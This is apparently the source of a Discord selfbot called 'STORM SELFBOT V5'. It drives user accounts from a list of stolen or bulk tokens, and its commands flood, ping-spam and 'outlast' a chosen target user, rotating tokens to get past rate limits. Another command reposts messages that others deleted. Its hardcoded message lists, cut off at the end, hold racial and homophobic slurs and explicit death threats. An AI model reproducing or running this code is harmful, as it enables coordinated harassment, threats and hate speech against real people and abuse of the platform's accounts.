import discord
import time
import random
import os
import json
import websockets
import io
import threading
from datetime import datetime
from alw import ALWHandler
from gcfill import GCFill
running_processes = {}
from discord.client import aiohttp
import asyncio
import subprocess
import requests
from discord.ext import commands
from datetime import datetime
from discord.ext import commands
from colorama import Fore
from io import BytesIO
import base64

    # ANSI color codes
R = "\033[0m"  # Reset
C = "\033[1;36m"  # Cyan
G = "\033[1;32m"  # Green
Y = "\033[1;33m"  # Yellow
B = "\033[1;34m"  # Blue
M = "\033[1;35m"  # Magenta
W = "\033[1;37m"  # White




alw_handler = None
# Load jokes from a file
def load_jokes():
    with open("jokes.txt", "r") as file:
        return [line.strip() for line in file.readlines()]

# Discord bot setup
status_rotation_active = False
emoji_rotation_active = False
current_status = ""
current_emoji = ""
dreact_users = {}
autoreact_users = {}
auto_reply_target_id = None
auto_reply_message = None

prefix = "."

# Define a function to get the current prefix
def get_prefix(bot, message):
    return prefix

# Set up the bot
bot = commands.Bot(command_prefix=get_prefix, self_bot=True, help_command= None)
black = "\033[30m"
red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
magenta = "\033[35m"
cyan = "\033[36m"
white = "\033[37m"
reset = "\033[0m"  
pink = "\033[38;2;255;192;203m"
white = "\033[37m"
blue = "\033[34m"
black = "\033[30m"
light_green = "\033[92m" 
light_yellow = "\033[93m" 
light_magenta = "\033[95m" 
light_cyan = "\033[96m"  
light_red = "\033[91m"  
light_blue = "\033[94m" 
www = Fore.WHITE
mkk = Fore.BLUE
b = Fore.BLACK
ggg = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX 
pps = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
qqq = Fore.MAGENTA
lbb = Fore.LIGHTBLUE_EX
mll = Fore.LIGHTBLUE_EX
mjj = Fore.RED
yyy = Fore.YELLOW





token = input("Enter Your Token: ")
        
bot.load_extension ('sgct')
bot.load_extension ('agct')

gcfill_cog = GCFill(bot)
bot.add_cog(gcfill_cog)
DISCORD_API_URL_SINGLE = "https://discord.com/api/v9/users/@me/settings"
single_status_rotation_task = None
single_status_list = []
single_status_delay = 3  # Default delay in seconds
# Command to change the prefix
@bot.command()
async def p(ctx, new_prefix):
    global prefix
    if new_prefix.lower() == "none":
        prefix = ""  # Set prefix to nothing
        await ctx.send("Prefix removed. Commands can now be used without a prefix.")
    else:
        prefix = new_prefix
        await ctx.send(f"Prefix changed to: {new_prefix}")

ar3_targets = {}
ar1_targets = {}
ar2_targets = {} 
react_active = False
selfreact_active = False 
ugc_task = None   




# Store the bot's start time
start_time = time.time()

@bot.command()
async def spam(ctx, amount: int, *, message: str):
    for _ in range(amount):
        await ctx.send(message)

# Utility Commands
@bot.command()
async def ping(ctx):
    current_time = time.time()
    uptime_seconds = int(current_time - start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime = f"{hours}h {minutes}m {seconds}s"

    latency = round(bot.latency * 1000)
    cached_messages = len(bot.cached_messages)
    cached_users = len(bot.users)
    servers = len(bot.guilds)

    message = (f"""```ansi
{magenta}
~ Bot Statistics
``````ansi\n

 {magenta}Latency: <{latency}ms>
 {cyan}Uptime: <{hours}h {minutes}m {seconds}s>
 {red}Cached Messages: <{cached_messages}>
 {yellow}Cached Users: <{cached_users}>
 {green}Servers: <{servers}>
``````ansi\n 
 {magenta}
       STORM SELFBOT V5
```""")
    await ctx.send(message)
    

# Dictionary to store user flood settings (user_id, server_id, None for DMs) -> message
auto_flood_users = {}

# Function to load autoflood data from ar_ids.txt and handle errors
def load_autoflood_data():
    global auto_flood_users
    if os.path.exists("ar_ids.txt"):
        try:
            with open("ar_ids.txt", "r") as f:
                for line in f:
                    try:
                        # Parse the line (user_id, message, server_id, or channel_id)
                        user_id, message, server_or_channel = line.strip().split("||")
                        auto_flood_users[(int(user_id), server_or_channel)] = message
                    except ValueError:
                        print(f"Error parsing line: {line.strip()}")
        except Exception as e:
            print(f"Error loading autoflood data: {str(e)}")
    else:
        print("No existing autoflood data found. Starting fresh.")

# Function to save autoflood data to ar_ids.txt
def save_autoflood_data():
    try:
        with open("ar_ids.txt", "w") as f:
            for (user_id, server_or_channel), message in auto_flood_users.items():
                f.write(f"{user_id}||{message}||{server_or_channel}\n")
    except Exception as e:
        print(f"Error saving autoflood data: {str(e)}")

# Function to send flood messages as a reply
async def send_flood_reply_message(original_message, message):
    flood_response = "\n" * 1000  # Adjust this as necessary
    full_message = f"A\n{flood_response}\n{message}"
    try:
        await original_message.reply(full_message, mention_author=True)
    except Exception as e:
        print(f"Error sending flood message: {str(e)}")

# Command to start autoflood
@bot.command()
async def autoflood(ctx, mentioned_user: discord.User, *, message:      str):
    await ctx.message.delete()
    user_id = mentioned_user.id
    if ctx.guild:  # If command is execQuted in a server
        server_id = ctx.guild.id
        # Store the user, message, and server ID (apply to the whole server)
        auto_flood_users[(user_id, str(server_id))] = message
        
    else:
        channel_id = ctx.channel.id  # If it's a DM or group chat
        # Store the user, message, and specific channel ID
        auto_flood_users[(user_id, str(channel_id))] = message
        

    # Save the updated autoflood data to the file
    save_autoflood_data()

# Command to stop autoflood
@bot.command()
async def stopautoflood(ctx, mentioned_user: discord.User):
    await ctx.message.delete()
    user_id = mentioned_user.id
    if ctx.guild:  # In server context
        server_id = ctx.guild.id
        key = (user_id, str(server_id))
    else:  # In DM/group chat context
        channel_id = ctx.channel.id
        key = (user_id, str(channel_id))

    if key in auto_flood_users:
        del auto_flood_users[key]  # Remove from active flood users
        
        # Save the updated autoflood data to remove the user
        save_autoflood_data()

        await ctx.send(f"Stopped autoflood for {mentioned_user.mention} in this context", delete_after=1)
    else:
        await ctx.send(f"{mentioned_user.mention} is not currently flooding in this context.", delete_after=1)
  
# Global variables
current_modes_200 = {}
message_count_200 = {}
jokes_200 = []  # Load jokes from jokes.txt
image_links_200 = {}  # Image links for each token
user_react_dict_200 = {}  # User IDs to ping for each token
delays_200 = {}  # Delay per token
send_messages_200 = {}  # To keep track of sending state

# Load jokes from jokes.txt
def load_jokes():
    with open('jokes.txt', 'r') as file:
        jokes = file.readlines()
    return [joke.strip() for joke in jokes]

jokes_200 = load_jokes()

def read_tokens(filename='tokens2.txt'):
    """Read tokens from a file and return them as a list."""
    with open(filename, 'r') as file:
        tokens = file.read().splitlines()
    return tokens

def get_token_by_position(position):
    """Retrieve a token by its position (1-based index)."""
    tokens = read_tokens()
    if 1 <= position <= len(tokens):
        return tokens[position - 1]
    return None


            
class MessageBot200(discord.Client):
    def __init__(self, token, channel_id, position, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token
        self.channel_id = channel_id
        self.position = position

    async def on_ready(self):
        print(f'Logged in as {self.user} using token {self.token[-4:]}.')
        await self.send_messages()

    async def send_messages(self):
        global message_count_200
        channel = self.get_channel(self.channel_id) or await self.fetch_channel(self.channel_id)

        while send_messages_200.get(self.position, False):  # Check if the token is allowed to send messages
            message_count_200[self.position] = message_count_200.get(self.position, 0) + 1

            # Check if message count exceeds 7
            if message_count_200[self.position] > 7:
                message_count_200[self.position] = 0  # Reset message count

            # Select a random joke
            joke = random.choice(jokes_200)
            words = joke.split()
            ping_user = user_react_dict_200.get(self.position, None)
            image_link = image_links_200.get(self.position, None)

            await self.simulate_typing(channel)

            mode = current_modes_200.get(self.position, 1)  # Default to mode 1 if not set
            delay = delays_200.get(self.position, 0.2)  # Default delay is 0.2 if not set

            # Debugging log to show the message being sent
            print(f"Sending message with token {self.position + 1}: {joke}")

            if mode == 1:  # Normal mode: Just sends joke (with ping/image if applicable)
                msg = joke
                if ping_user:
                    msg += f" <@{ping_user}>"
                if image_link:
                    msg += f" {image_link}"
                await channel.send(msg)
                await asyncio.sleep(delay)

            elif mode == 2:  # Header mode: Adds # before the joke
                msg = f"# {joke}"
                if ping_user:
                    msg += f" <@{ping_user}>"
                if image_link:
                    msg += f" {image_link}"
                await channel.send(msg)
                await asyncio.sleep(delay)

            elif mode == 3:  # > # mode: Adds > # before the joke
                msg = f"> # {joke}"
                if ping_user:
                    msg += f" <@{ping_user}>"
                if image_link:
                    msg += f" {image_link}"
                await channel.send(msg)
                await asyncio.sleep(delay)

    async def simulate_typing(self, channel):
        """Simulate typing before sending a message."""
        async with channel.typing():
            await asyncio.sleep(random.uniform(1, 3))  # Simulate typing for a random time

@bot.command()
async def asma(ctx, mode: int):
    """Set the mode for all tokens."""
    if mode in [1, 2, 3]:
        for position in range(len(read_tokens())):
            current_modes_200[position] = mode
        await ctx.send(f"All tokens have been set to mode {mode}.")
    else:
        await ctx.send("Invalid mode. Please choose 1, 2, or 3.")
# Changes in the als command
@bot.command()
async def als(ctx, channel_id: int):
    """Start sending messages using the tokens in the specified channel."""
    global send_messages_200
    send_messages_200.clear()  # Clear previous session data
    
    tokens = read_tokens()  # Read tokens from tokens2.txt
    tasks = []  # A list to hold all tasks

    for position, token in enumerate(tokens):
        send_messages_200[position] = True  # Enable message sending for this token
        message_count_200[position] = 0  # Reset message count
        current_modes_200[position] = 1  # Default to mode 1 for each token
        delays_200[position] = 0.2  # Default delay for each token

        # Create a new MessageBot200 instance for each token and start it
        client = MessageBot200(token, channel_id, position)
        tasks.append(client.start(token, bot=False))  # Start the bot for this token

    # Wait for all tokens to start sending messages
    await asyncio.gather(*tasks)  
    await ctx.send(f"Started sending messages in channel {channel_id} with {len(tokens)} tokens.")
@bot.command()
async def asp(ctx, position: int, user_id: int):
    """Set ping for the specified token."""
    if 1 <= position <= len(read_tokens()):
        user_react_dict_200[position - 1] = user_id
        await ctx.send(f"Token at position {position} will now ping user <@{user_id}> at the end of messages.")
    else:
        await ctx.send(f"Invalid position. Please provide a position between 1 and {len(read_tokens())}.")

@bot.command()
async def aspa(ctx, user_id: int):
    """Set ping for all tokens."""
    for position in range(len(read_tokens())):
        user_react_dict_200[position] = user_id
    await ctx.send(f"All tokens will now ping user <@{user_id}> at the end of messages.")

@bot.command()
async def asi(ctx, position: int, image_url: str):
    """Set the image link for the specified token."""
    if 1 <= position <= len(read_tokens()):
        image_links_200[position - 1] = image_url
        await ctx.send(f"Image link set for token at position {position}.")
    else:
        await ctx.send(f"Invalid position. Please provide a position between 1 and {len(read_tokens())}.")

@bot.command()
async def asia(ctx, image_url: str):
    """Set the image link for all tokens."""
    for position in range(len(read_tokens())):
        image_links_200[position] = image_url
    await ctx.send("Image link set for all tokens.")

@bot.command()
async def asm(ctx, position: int, mode: int):
    """Set the mode for the specified token."""
    if 1 <= position <= len(read_tokens()):
        if mode in [1, 2, 3]:
            current_modes_200[position - 1] = mode
            await ctx.send(f"Mode for token at position {position} changed to {mode}.")
        else:
            await ctx.send("Invalid mode. Please choose 1, 2, or 3.")
    else:
        await ctx.send(f"Invalid position. Please provide a position between 1 and {len(read_tokens())}.")
# Commands for changing delay
@bot.command()
async def asd(ctx, position: int, delay: float):
    """Set the delay for a specific token."""
    if 1 <= position <= len(read_tokens()):
        delays_200[position - 1] = delay  # Set the delay for the specified token
        await ctx.send(f"Delay for token at position {position} set to {delay} seconds.")
    else:
        await ctx.send(f"Invalid position. Please provide a position between 1 and {len(read_tokens())}.")

@bot.command()
async def asda(ctx, delay: float):
    """Set the delay for all tokens."""
    for position in range(len(read_tokens())):
        delays_200[position] = delay  # Set the delay for all tokens
    await ctx.send(f"Delay for all tokens set to {delay} seconds.")
@bot.command()
async def ase(ctx):
    """Stop the sending of messages."""
    global send_messages_200
    send_messages_200.clear()  # Stop all tokens from sending messages
    await ctx.send("Message sending process has been stopped.")
    
  
  
  
  
killloop = asyncio.Event()

REQUEST_DELAY = 0.1
MAX_REQUESTS_BEFORE_SWITCH = 4

def load_file(file_path):
    """Helper function to load a file into a list."""
    with open(file_path, "r") as file:
        return [line.strip() for line in file if line.strip()]

def load_tokens():
    return load_file("tokens2.txt")  # Load tokens from tokens2.txt

def load_packs():
    return load_file("jokes.txt")

def log_action(message, channel=None):
    """Log formatted message to the console with timestamp and location type."""
    timestamp = datetime.now().strftime('%H:%M:%S')
    location = "Start"
    if channel:
        if isinstance(channel, discord.DMChannel):
            location = "DM"
        elif isinstance(channel, discord.TextChannel):
            location = "CH"
        elif isinstance(channel, discord.GroupChannel):
            location = "GC"
    
    print(f"{timestamp} - in {location}: {message}")

async def manage_outlaster(channel_id, user_id, name):
    """Main function for sending messages using tokens and handling rate limits."""
    tokens = load_tokens()
    messages = load_packs()
    if not tokens or not messages:
        log_action("Missing tokens or message packs.", bot.get_channel(channel_id))
        return

    log_action("Starting outlaster message sending...", bot.get_channel(channel_id))
    current_value = message_count = token_index = 0
    while not killloop.is_set() and tokens:
        if token_index >= len(tokens):
            token_index = 0
        
        token = tokens[token_index]
        headers = {"Authorization": f"{token}"}
        json_data = {"content": f"{random.choice(messages)} {name} <@{user_id}> \n ```{current_value}```"}
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        
        response = requests.post(url, headers=headers, json=json_data)
        if response.status_code == 200:
            log_action(f"Message sent with token {token_index + 1}", bot.get_channel(channel_id))
            message_count += 1
            current_value += 1
            await asyncio.sleep(REQUEST_DELAY)

            if message_count >= MAX_REQUESTS_BEFORE_SWITCH:
                message_count = 0
                token_index += 1
        elif response.status_code == 429:
            log_action("Rate limited; retrying...", bot.get_channel(channel_id))
            await asyncio.sleep(0.5)
        elif response.status_code == 403:
            log_action(f"Invalid token {token_index + 1}; removing from list.", bot.get_channel(channel_id))
            tokens.pop(token_index)
        else:
            log_action(f"Error: HTTP {response.status_code}; retrying with next token.", bot.get_channel(channel_id))
            token_index += 1

    log_action("Outlaster message sending stopped.", bot.get_channel(channel_id))

def start_outlaster_thread(channel_id, user_id,name):
    threading.Thread(target=asyncio.run, args=(manage_outlaster(channel_id, user_id,name),)).start()

name = {}

@bot.command()
async def kill(ctx, user: discord.User, channel_id: int, *, name: str = None):  # name is now optional
    await ctx.message.delete()  # Delete the command message
    killloop.clear()  # Clear any existing kill loops
    start_outlaster_thread(channel_id, user.id, name)  # Start the outlaster thread with the name

    # Send a confirmation message
    if name:
        await ctx.send(f"Outlaster started for {user.mention} with name '{name}'.", delete_after=5)
    else:
        await ctx.send(f"Outlaster started for {user.mention}.", delete_after=5)

@bot.command()
async def kille(ctx):
    await ctx.message.delete()
    killloop.set()
    await ctx.send("Outlaster stopped.", delete_after=5)



@bot.command()
async def ladderap(ctx, user: discord.User,name):
        with open("tokens2.txt", "r") as f:
         tokens = f.read().splitlines()
        global stop_eventText4
        stop_eventText4.clear()
        channel_id = ctx.channel.id
        user_id = user.id
        name = name
        await ctx.message.delete()
    
        spam_message_list = load_spam_messages()
        
        laddered_message_list = ['\n'.join(message.split()) for message in spam_message_list]
        
        tasks = [send_spam_messagesladdder(token, channel_id, laddered_message_list, user_id,name) for token in tokens[1:]]
        
        await asyncio.gather(*tasks)
def load_spam_messages():
    with open("jokes.txt", "r") as file:
        return [line.strip() for line in file if line.strip()]
    
name = {}   
    
async def send_spam_messagesladdder(token, channel_id, spam_message_list, user_id, name):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }

    async with aiohttp.ClientSession() as session:
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        log_action(f"Sending messages to channel {channel_id} with token {token[:10]}...")

        while not stop_eventText4.is_set(): 
            try:
                while not stop_eventText4.is_set():
                    spam_message = random.choice(spam_message_list)
                    message_with_mention = f"{spam_message} {name} <@{user_id}>"
                    json_data = {"content": message_with_mention}

                    try:
                        async with session.post(
                            url, headers=headers, json=json_data
                        ) as response:
                            await handle_response(response)

                    except Exception as e:
                        log_action(f"An error occurred during sending: {e}")

                    await asyncio.sleep(cooldown_time)

            except Exception as e:
                log_action(f"An error occurred in the loop: {e}")
                await asyncio.sleep(1)

                
                
async def handle_response(response):
    if response.status == 200:
        log_action("Message sent successfully.")
    elif response.status == 429:
        log_action("Rate limited. Retrying after 10 seconds...")
        await asyncio.sleep(10)
    else:
        log_action(f"Failed to send message. Status: {response.status}")

@bot.command()
async def stopladderap(ctx):
        global stop_eventText4
        stop_eventText4.set()
        log_action(f" Executed stopladderap command to stop ladderap command", ctx.channel)
        await ctx.message.delete()
        await ctx.send("Stopped ladderap command", delete_after=5)
        
        
@bot.command()
async def cd(ctx, seconds: float):
        log_action(f"Executed cd command", ctx.channel)
        global cooldown_time
        await ctx.message.delete()
        cooldown_time = seconds
        await ctx.send(f"Cooldown time set to {cooldown_time} seconds.", delete_after=5)
        log_action(f"Cooldown time set to {cooldown_time} seconds", ctx.channel)


cooldown_time = 3       

stop_eventText4 = asyncio.Event()

bot.activity_texts = {}


@bot.command()
async def pressap(ctx, user: discord.User):
        with open("tokens2.txt", "r") as f:
         tokens = f.read().splitlines()
        log_action(f"Executed ap command", ctx.channel)
        global stop_eventText
        stop_eventText.clear()
        channel_id = ctx.channel.id
        user_id = user.id
        await ctx.message.delete()
    
        spam_message_list = load_spam_messages()
        
        tasks = [send_spam_messages(token, channel_id, spam_message_list, user_id) for token in tokens[1:]]
        
        await asyncio.gather(*tasks)

@bot.command()
async def pressapstop(ctx):
        global stop_eventText
        stop_eventText.set()
        log_action(f"Executed drop command to stop ap command", ctx.channel)
        await ctx.message.delete()
        await ctx.send("Stopped ap command", delete_after=5)
        
async def send_spam_messages(token, channel_id, spam_message_list, user_id):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }

    async with aiohttp.ClientSession() as session:
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        log_action(f"Sending messages to channel {channel_id} with token {token[:10]}...")

        while not stop_eventText.is_set(): 
            try:
                while not stop_eventText.is_set():
                    spam_message = random.choice(spam_message_list)
                    message_with_mention = f"{spam_message} <@{user_id}>"
                    json_data = {"content": message_with_mention}

                    try:
                        async with session.post(
                            url, headers=headers, json=json_data
                        ) as response:
                            await handle_response(response)

                    except Exception as e:
                        log_action(f"An error occurred during sending: {e}")

                    await asyncio.sleep(cooldown_time)

            except Exception as e:
                log_action(f"An error occurred in the loop: {e}")
                await asyncio.sleep(1)

async def send_spam_messagesladdder(token, channel_id, spam_message_list, user_id):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }

    async with aiohttp.ClientSession() as session:
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        log_action(f"Sending messages to channel {channel_id} with token {token[:10]}...")

        while not stop_eventText4.is_set(): 
            try:
                while not stop_eventText4.is_set():
                    spam_message = random.choice(spam_message_list)
                    message_with_mention = f"{spam_message} <@{user_id}>"
                    json_data = {"content": message_with_mention}

                    try:
                        async with session.post(
                            url, headers=headers, json=json_data
                        ) as response:
                            await handle_response(response)

                    except Exception as e:
                        log_action(f"An error occurred during sending: {e}")

                    await asyncio.sleep(cooldown_time)

            except Exception as e:
                log_action(f"An error occurred in the loop: {e}")
                await asyncio.sleep(1)

            
async def handle_response(response):
    if response.status == 200:
        log_action("Message sent successfully.")
    elif response.status == 429:
        log_action("Rate limited. Retrying after 10 seconds...")
        await asyncio.sleep(10)
    else:
        log_action(f"Failed to send message. Status: {response.status}")

async def heartbeat(ws, interval):
    try:
        while True:
            await asyncio.sleep(interval)
            await ws.send(json.dumps({"op": 1, "d": None}))
    except websockets.ConnectionClosed:
        log_action("Connection closed, stopping heartbeat.")
        return

stop_eventText = asyncio.Event()

deleted_messages = {}

@bot.event
async def on_message_delete(message):

    channel = message.channel
    if channel not in deleted_messages:
        deleted_messages[channel] = []

    deleted_messages[channel].append((message.author, message.content))
    if len(deleted_messages[channel]) > 10:
        deleted_messages[channel].pop(0)

auto_delete = set()

@bot.command()
async def snipe(ctx):
    await ctx.message.delete()
    channel = ctx.channel

    if channel not in deleted_messages or not deleted_messages[channel]:
        await ctx.send("-# no deleted messages to snipe in this channel.", delete_after=1)
        return

    sniped_messages = deleted_messages[channel][-10:]  # Get the last 10 deleted messages
    sniped_text = "**Last deleted messages:**\n"

    for author, content, attachments in sniped_messages:
        sniped_text += f"-# - **{author.name}:** {content or '*No content*'}\n"
        if attachments:  # Add attachment URLs if present
            for attachment in attachments:
                sniped_text += f"  -# [Attachment]({attachment.url})\n"

    await ctx.send(sniped_text, delete_after=30)
    
    
# Run the bot


# Run the bot

INTERVAL = 1  # Time between guild identity changes
GUILDS = {

    "hail": "1034280738129989704",
    "hesi": "1262925088374915204",
    "god": "1264051999595302932",
}
DISCORD_API_URL = "https://discord.com/api/v9/users/@me/clan"
guild_rotation_task = None

def change_identity(guild_name, guild_id):
    headers = {
        "Accept": "*/*",
        "Authorization": token,
        "Content-Type": "application/json"
    }

    payload = {
        "identity_guild_id": guild_id,
        "identity_enabled": True
    }

    try:
        response = requests.put(DISCORD_API_URL, headers=headers, json=payload)
        if response.status_code == 200:
            print(f"Successfully changed to {guild_name}")
        else:
            print(f"Failed to change to {guild_name}. Status Code: {response.status_code}, Response: {response.text}")
    except requests.RequestException as e:
        print(f"Error while changing to {guild_name}: {e}")

async def rotate_guilds():
    while True:
        for guild_name, guild_id in GUILDS.items():
            change_identity(guild_name, guild_id)
            await asyncio.sleep(INTERVAL)

@bot.command()
async def rg(ctx):
    global guild_rotation_task
    if guild_rotation_task is None:
        guild_rotation_task = bot.loop.create_task(rotate_guilds())
        await ctx.send("Guild rotation started!")
    else:
        await ctx.send("Guild rotation is already running.")

@bot.command()
async def rge(ctx):
    global guild_rotation_task
    if guild_rotation_task is not None:
        guild_rotation_task.cancel()
        guild_rotation_task = None
        await ctx.send("Guild rotation stopped!")
    else:
        await ctx.send("Guild rotation is not running.")

@bot.command()
async def rgd(ctx, delay: int):
    """Change the delay for the guild rotation."""
    global INTERVAL
    if delay > 0:
        INTERVAL = delay
        await ctx.send(f"Guild rotation delay changed to {INTERVAL} seconds.")
    else:
        await ctx.send("Delay must be a positive integer.")
        
import math



@bot.command()
async def menu(ctx, page: int = 1):
    # Initial loading message
    loading_msg = await ctx.send("```ansi\n[36mLoading command menu...[0m\n```")
    
    commands_list = sorted([cmd for cmd in bot.commands if not cmd.hidden],
                         key=lambda cmd: cmd.qualified_name.lower())
    
    commands_per_page = 10
    total_commands = len(commands_list)
    total_pages = math.ceil(total_commands / commands_per_page)

    if page < 1 or page > total_pages:
        await loading_msg.delete()
        await ctx.send(f"```diff\n- ERROR: Invalid page ({page}). Valid range: 1-{total_pages}\n```", delete_after=10)
        return

    # Calculate loading progress
    progress = min(100, int((page / total_pages) * 100))
    progress_bar = f"[32m{'█' * (progress//5)}[37m{'░' * (20 - progress//5)}[0m"

    # ANSI Color Codes
    R = "\033[0m"  # Reset
    B = "\033[1m"   # Bold
    C = "\033[36m"  # Cyan
    G = "\033[32m"  # Green
    Y = "\033[33m"  # Yellow
    M = "\033[35m"  # Magenta
    W = "\033[37m"  # White

    # Build the menu
    menu = f"""```ansi
{C}╭──────────────────────────────────────────────╮
{B}{M}          STORM SELFBOT V5 - COMMAND MENU       {R}
{C}├──────────────────────────────────────────────┤
{G} {W}Page: {G}{page}/{total_pages} {Y} {W}Commands: {G}{total_commands} {Y}◈{R}

"""

    max_name_len = max(len(cmd.name) for cmd in commands_list) if commands_list else 0

    for i, cmd in enumerate(commands_list[(page-1)*commands_per_page:page*commands_per_page], 1):
        num = f"{i + (page-1)*commands_per_page}".zfill(2)
        cmd_name = f"{cmd.name.ljust(max_name_len)}"
        menu += f"{G}[{num}] {C}{cmd_name} {Y}→ {W}{cmd.signature}{R}\n"

    menu += f"""\n{C}├──────────────────────────────────────────────┤
{Y}{B}Tip:{R} {W}Type {G}{ctx.prefix}help <command> {W}for details
{C}╰──────────────────────────────────────────────╯
{M}{B}Developer: {C}NotHerXenon{R}
```"""

    await loading_msg.delete()
    await ctx.send(menu, delete_after=60)
    
     
        
import platform
import psutil

@bot.command()
async def hostinfo(ctx):
    system = platform.system()
    release = platform.release()
    version = platform.version()
    uptime = datetime.now() - datetime.fromtimestamp(psutil.boot_time())
    uptime_str = str(uptime).split('.')[0]  # Removing microseconds

    memory = psutil.virtual_memory()
    memory_total = memory.total // (1024 ** 3)
    memory_used = memory.used // (1024 ** 3)
    memory_percent = memory.percent

    cpu_usage = psutil.cpu_percent(interval=1)
    cpu_load = psutil.getloadavg() if hasattr(psutil, "getloadavg") else ("N/A", "N/A", "N/A")

    info = (
        f"STORM SELFBOT"
        f"Version : V5"
        f"Prefix : {prefix}"
        f"**Host Information**\n"
        f"System: {system} {release} ({version})\n"
        f"Uptime: {uptime_str}\n"
        f"Memory Usage: {memory_used} GB / {memory_total} GB ({memory_percent}%)\n"
        f"CPU Usage: {cpu_usage}%\n"
        f"CPU Load: 1 min: {cpu_load[0]}, 5 min: {cpu_load[1]}, 15 min: {cpu_load[2]}"
    )

    await ctx.send(info) 
    
    
outlast_messages = ["NIGGA UR FACING THE GODS OF ELITE\nNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS UNIGGA UR FACING THE GODS OF ELITE  RUNS U "]       
@bot.command()
async def multilast(ctx, user: discord.User):
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()
    global outlast_running
    outlast_running = True

    class SharedCounter:
        def __init__(self):
            self.value = 1
            self.lock = asyncio.Lock()

        async def increment(self):
            async with self.lock:
                current = self.value
                self.value += 1
                return current

    shared_counter = SharedCounter()

    async def send_message(token):
        headers = {'Authorization': token,'Content-Type': 'application/json'}

        token_counter = 1

        while outlast_running:
            message = random.choice(outlast_messages)
            global_count = await shared_counter.increment()

            payload = {'content': f"{user.mention} {message}\n```{global_count}```"}

            async with aiohttp.ClientSession() as session:
                async with session.post(f'https://discord.com/api/v9/channels/{ctx.channel.id}/messages', 
                                      headers=headers, json=payload) as resp:
                    if resp.status == 200:
                        print(f"Message sent with token: {token}")
                        token_counter += 1
                    elif resp.status == 429:
                        print(f"Rate limited with token: {token}. Retrying...")
                        await asyncio.sleep(1)
                    else:
                        print(f"Failed to send message with token: {token}. Status code: {resp.status}")

            await asyncio.sleep(0.1)

    tasks = [send_message(token) for token in tokens]
    await asyncio.gather(*tasks)

@bot.command()
async def stopmultilast(ctx):
    global outlast_running
    if outlast_running:
        outlast_running = False  
        await ctx.send("The multilast command has been stopped.")
outlast_tasks = {}
murder_messages = [ "nb cares faggot", "YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck dogshit ass nigga",
"SHUT\nUP\nFAGGOT\nASS\nNIGGA\nYOU\nARE\nNOT\nON\nMY\nLEVEL\nILL\nFUCKING\nKILL\nYOU\nDIRTY\nASS\nPIG\nBASTARD\nBARREL\nNOSTRIL\nFAGGOT\nI\nOWN\nYOU\nKID\nSTFU\nLAME\nASS\nNIGGA\nU\nFUCKING\nSUCK\nI\nOWN\nBOW\nDOWN\nTO\nME\nPEASENT\nFAT\nASS\nNIGGA",
"ILL\nTAKE\nUR\nFUCKING\nSKULL\nAND\nSMASH\nIT\nU\nDIRTY\nPEDOPHILE\nGET\nUR\nHANDS\nOFF\nTHOSE\nLITTLE\nKIDS\nNASTY\nASS\nNIGGA\nILL\nFUCKNG\nKILL\nYOU\nWEIRD\nASS\nSHITTER\nDIRTFACE\nUR\nNOT\nON\nMY\nLEVEL\nCRAZY\nASS\nNIGGA\nSHUT\nTHE\nFUCK\nUP",
"NIGGAS\nTOSS\nU\nAROUND\nFOR\nFUN\nU\nFAT\nFUCK\nSTOP\nPICKING\nUR\nNOSE\nFAGGOT\nILL\nSHOOT\nUR\nFLESH\nTHEN\nFEED\nUR\nDEAD\nCORPSE\nTO\nMY\nDOGS\nU\nNASTY\nIMBECILE\nSTOP\nFUCKING\nTALKING\nIM\nABOVE\nU\nIN\nEVERY\nWAY\nLMAO\nSTFU\nFAT\nNECK\nASS\nNIGGA",
"dirty ass rodent molester",
